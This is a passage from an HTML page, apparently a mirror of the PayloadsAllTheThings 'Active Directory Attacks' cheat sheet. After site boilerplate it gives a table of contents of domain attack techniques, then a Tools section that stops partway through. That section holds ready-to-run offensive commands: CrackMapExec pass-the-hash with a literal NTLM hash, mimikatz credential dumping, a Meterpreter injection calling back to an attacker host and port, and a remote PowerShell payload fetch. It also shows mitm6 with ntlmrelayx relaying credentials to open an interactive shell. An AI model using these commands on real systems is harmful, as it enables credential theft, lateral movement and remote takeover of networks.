<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Active Directory Attacks" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Summary" />
<meta property="og:description" content="Summary" />
<link rel="canonical" href="http://localhost:4000/Active-Directory-Attacks/" />
<meta property="og:url" content="http://localhost:4000/Active-Directory-Attacks/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-06T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Active Directory Attacks" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Active Directory Attacks","dateModified":"2021-05-06T00:00:00+07:00","datePublished":"2021-05-06T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Active-Directory-Attacks/"},"url":"http://localhost:4000/Active-Directory-Attacks/","description":"Summary","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Active Directory Attacks | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Active Directory Attacks</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Active Directory Attacks</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, May  6, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    May  6, 2021
  

  <i class="unloaded">2021-05-06T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="12182 words">67 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h2 id="summary">Summary</h2>

<ul>
  <li><a href="#active-directory-attacks">Active Directory Attacks</a>
    <ul>
      <li><a href="#summary">Summary</a></li>
      <li><a href="#tools">Tools</a></li>
      <li><a href="#active-directory-recon">Active Directory Recon</a>
        <ul>
          <li><a href="#using-bloodhound">Using BloodHound</a></li>
          <li><a href="#using-powerview">Using PowerView</a></li>
          <li><a href="#using-ad-module">Using AD Module</a></li>
        </ul>
      </li>
      <li><a href="#most-common-paths-to-ad-compromise">Most common paths to AD compromise</a>
        <ul>
          <li><a href="#ms14-068-microsoft-kerberos-checksum-validation-vulnerability">MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)</a></li>
          <li><a href="#cve-2020-1472-zerologon">CVE-2020-1472 ZeroLogon</a></li>
          <li><a href="#open-shares">Open Shares</a></li>
          <li><a href="#scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</a></li>
          <li><a href="#passwords-in-sysvol-&amp;-group-policy-preferences">Passwords in SYSVOL &amp; Group Policy Preferences</a></li>
          <li><a href="#exploit-group-policy-objects-gpo">Exploit Group Policy Objects GPO</a>
            <ul>
              <li><a href="#find-vulnerable-gpo">Find vulnerable GPO</a></li>
              <li><a href="#abuse-gpo-with-sharpgpoabuse">Abuse GPO with SharpGPOAbuse</a></li>
              <li><a href="#abuse-gpo-with-powergpoabuse">Abuse GPO with PowerGPOAbuse</a></li>
              <li><a href="#abuse-gpo-with-pygpoabuse">Abuse GPO with pyGPOAbuse</a></li>
              <li><a href="#abuse-gpo-with-powerview">Abuse GPO with PowerView</a></li>
            </ul>
          </li>
          <li><a href="#dumping-ad-domain-credentials">Dumping AD Domain Credentials</a>
            <ul>
              <li><a href="#using-ndtsutil">Using ndtsutil</a></li>
              <li><a href="#using-vshadow">Using Vshadow</a></li>
              <li><a href="#using-vssadmin">Using vssadmin</a></li>
              <li><a href="#using-diskshadow-a-windows-signed-binary">Using DiskShadow (a Windows signed binary)</a></li>
              <li><a href="#using-esentutlexe">Using esentutl.exe</a></li>
              <li><a href="#extract-hashes-from-ntdsdit">Extract hashes from ntds.dit</a></li>
              <li><a href="#alternatives---modules">Alternatives - modules</a></li>
              <li><a href="#using-mimikatz-dcsync">Using Mimikatz DCSync</a></li>
              <li><a href="#using-mimikatz-sekurlsa">Using Mimikatz sekurlsa</a></li>
            </ul>
          </li>
          <li><a href="#password-spraying">Password spraying</a>
            <ul>
              <li><a href="#kerberos-pre-auth-bruteforcing">Kerberos pre-auth bruteforcing</a></li>
              <li><a href="#spray-a-pre-generated-passwords-list">Spray a pre-generated passwords list</a></li>
              <li><a href="#spray-passwords-against-the-rdp-service">Spray passwords against the RDP service</a></li>
            </ul>
          </li>
          <li><a href="#password-in-ad-user-comment">Password in AD User comment</a></li>
          <li><a href="#reading-laps-password">Reading LAPS Password</a></li>
          <li><a href="#reading-gmsa-password">Reading GMSA Password</a></li>
          <li><a href="#pass-the-ticket-golden-tickets">Pass-the-Ticket Golden Tickets</a>
            <ul>
              <li><a href="#using-mimikatz">Using Mimikatz</a></li>
              <li><a href="#using-meterpreter">Using Meterpreter</a></li>
              <li><a href="#using-a-ticket-on-linux">Using a ticket on Linux</a></li>
            </ul>
          </li>
          <li><a href="#pass-the-ticket-silver-tickets">Pass-the-Ticket Silver Tickets</a></li>
          <li><a href="#kerberoasting">Kerberoasting</a></li>
          <li><a href="#krbasrep-roasting">KRB_AS_REP Roasting</a></li>
          <li><a href="#pass-the-hash">Pass-the-Hash</a></li>
          <li><a href="#overpass-the-hash-pass-the-key">OverPass-the-Hash (pass the key)</a>
            <ul>
              <li><a href="#using-impacket">Using impacket</a></li>
              <li><a href="#using-rubeus">Using Rubeus</a></li>
            </ul>
          </li>
          <li><a href="#capturing-and-cracking-ntlmv2-hashes">Capturing and cracking NTLMv2 hashes</a></li>
          <li><a href="#man-in-the-middle-attacks--relaying">Man-in-the-Middle attacks &amp; relaying</a>
            <ul>
              <li><a href="#ms08-068-ntlm-reflection">MS08-068 NTLM reflection</a></li>
              <li><a href="#smb-signing-disabled-and-ipv4">SMB Signing Disabled and IPv4</a></li>
              <li><a href="#smb-signing-disabled-and-ipv6">SMB Signing Disabled and IPv6</a></li>
              <li><a href="#drop-the-mic">Drop the MIC</a></li>
              <li><a href="#ghost-potato---cve-2019-1384">Ghost Potato - CVE-2019-1384</a></li>
            </ul>
          </li>
          <li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
          <li><a href="#abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</a>
            <ul>
              <li><a href="#genericall">GenericAll</a></li>
              <li><a href="#genericwrite">GenericWrite</a>
                <ul>
                  <li><a href="#genericwrite-and-remote-connection-manager">GenericWrite and Remote Connection Manager</a></li>
                </ul>
              </li>
              <li><a href="#writedacl">WriteDACL</a></li>
              <li><a href="#writeowner">WriteOwner</a></li>
              <li><a href="#readlapspassword">ReadLAPSPassword</a></li>
              <li><a href="#readgmsapassword">ReadGMSAPassword</a></li>
              <li><a href="#forcechangepassword">ForceChangePassword</a></li>
            </ul>
          </li>
          <li><a href="#dcom-exploitation">DCOM Exploitation</a>
            <ul>
              <li><a href="#dcom-via-mmc-application-class">DCOM via MMC Application Class</a></li>
              <li><a href="#dcom-via-excel">DCOM via Excel</a></li>
              <li><a href="#dcom-via-shellexecute">DCOM via ShellExecute</a></li>
            </ul>
          </li>
          <li><a href="#trust-relationship-between-domains">Trust relationship between domains</a></li>
          <li><a href="#child-domain-to-forest-compromise---sid-hijacking">Child Domain to Forest Compromise - SID Hijacking</a></li>
          <li><a href="#forest-to-forest-compromise---trust-ticket">Forest to Forest Compromise - Trust Ticket</a></li>
          <li><a href="#kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</a></li>
          <li><a href="#kerberos-constrained-delegation">Kerberos Constrained Delegation</a></li>
          <li><a href="#kerberos-resource-based-constrained-delegation">Kerberos Resource Based Constrained Delegation</a></li>
          <li><a href="#kerberos-bronze-bit-attack---cve-2020-17049">Kerberos Bronze Bit Attack - CVE-2020-17049</a></li>
          <li><a href="#relay-delegation-with-mitm6">Relay delegation with mitm6</a></li>
          <li><a href="#privexchange-attack">PrivExchange attack</a></li>
          <li><a href="#pxe-boot-image-attack">PXE Boot image attack</a></li>
          <li><a href="#dsrm-credentials">DSRM Credentials</a></li>
          <li><a href="#impersonating-office-365-users-on-azure-ad-connect">Impersonating Office 365 Users on Azure AD Connect</a></li>
        </ul>
      </li>
      <li><a href="#linux-active-directory">Linux Active Directory</a>
        <ul>
          <li><a href="#ccache-ticket-reuse-from-tmp">CCACHE ticket reuse from /tmp</a></li>
          <li><a href="#ccache-ticket-reuse-from-keyring">CCACHE ticket reuse from keyring</a></li>
          <li><a href="#ccache-ticket-reuse-from-keytab">CCACHE ticket reuse from keytab</a></li>
          <li><a href="#extract-accounts-from-etckrb5keytab">Extract accounts from /etc/krb5.keytab</a></li>
        </ul>
      </li>
      <li><a href="#references">References</a></li>
    </ul>
  </li>
</ul>

<h2 id="tools">Tools</h2>

<ul>
  <li><a href="https://github.com/CoreSecurity/impacket">Impacket</a> or the <a href="https://github.com/maaaaz/impacket-examples-windows">Windows version</a></li>
  <li><a href="https://github.com/lgandx/Responder">Responder</a></li>
  <li><a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a></li>
  <li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
  <li><a href="https://github.com/funkandwagnalls/ranger">Ranger</a></li>
  <li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">AdExplorer</a></li>
  <li>
    <p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="c"># use the latest release, CME is now a binary packaged will all its dependencies</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">wget</span><span class="w"> </span><span class="nx">https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip</span><span class="w">

</span><span class="c"># execute cme (smb, winrm, mssql, ...)</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nt">-L</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">name_module</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">VAR</span><span class="o">=</span><span class="kr">DATA</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">5858d47a41e40b40f294b3100bea611f</span><span class="w"> </span><span class="nt">--local-auth</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">5858d47a41e40b40f294b3100bea611f</span><span class="w"> </span><span class="nt">--shares</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s1">':5858d47a41e40b40f294b3100bea611f'</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">'DOMAIN'</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">invoke_sessiongopher</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">5858d47a41e40b40f294b3100bea611f</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">rdp</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">ACTION</span><span class="o">=</span><span class="n">enable</span><span class="w">
</span><span class="nx">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">5858d47a41e40b40f294b3100bea611f</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">metinject</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">1</span><span class="o">.</span><span class="nf">63</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">4443</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">":5858d47a41e40b40f294b3100bea611f"</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">web_delivery</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">URL</span><span class="o">=</span><span class="s2">"https://IP:PORT/posh-payload"</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">":5858d47a41e40b40f294b3100bea611f"</span><span class="w"> </span><span class="nt">--exec-method</span><span class="w"> </span><span class="nx">smbexec</span><span class="w"> </span><span class="nt">-X</span><span class="w"> </span><span class="s1">'whoami'</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.10.14.0/24</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'Password'</span><span class="w"> </span><span class="nt">--local-auth</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">mimikatz</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">mimikatz</span><span class="w"> </span><span class="nt">--server</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="nt">--server-port</span><span class="w"> </span><span class="nx">80</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/fox-it/mitm6.git">Mitm6</a></p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>git clone https://github.com/fox-it/mitm6.git <span class="o">&amp;&amp;</span> <span class="nb">cd </span>mitm6
pip <span class="nb">install</span> <span class="nb">.</span>
mitm6 <span class="nt">-d</span> lab.local
ntlmrelayx.py <span class="nt">-wh</span> 192.168.218.129 <span class="nt">-t</span> smb://192.168.218.128/ <span class="nt">-i</span>
<span class="c"># -wh: Server hosting WPAD file (Attacker’s IP)</span>
<span class="c"># -t: Target (You cannot relay credentials to the same device that you’re spoofing)</span>
<span class="c"># -i: open an interactive shell</span>
ntlmrelayx.py <span class="nt">-t</span> ldaps://lab.local <span class="nt">-wh</span> attacker-wpad <span class="nt">--delegate-access</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">.</span><span class="n">\ADRecon.ps1</span><span class="w"> </span><span class="nt">-DomainController</span><span class="w"> </span><span class="nx">MYAD.net</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">MYAD\myuser</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/hausec/ADAPE-Script">Active Directory Assessment and Privilege Escalation Script</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="o">.</span><span class="nx">/ADAPE.ps1</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/vletoux/pingcastle">Ping Castle</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">pingcastle.exe</span><span class="w"> </span><span class="nt">--healthcheck</span><span class="w"> </span><span class="nt">--server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DOMAIN_CONTROLLER_IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">USERNAME</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--password</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PASSWORD</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--advanced-live</span><span class="w"> </span><span class="nt">--nullsession</span><span class="w">
  </span><span class="n">pingcastle.exe</span><span class="w"> </span><span class="nt">--healthcheck</span><span class="w"> </span><span class="nt">--server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
  </span><span class="n">pingcastle.exe</span><span class="w"> </span><span class="nt">--graph</span><span class="w"> </span><span class="nt">--server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
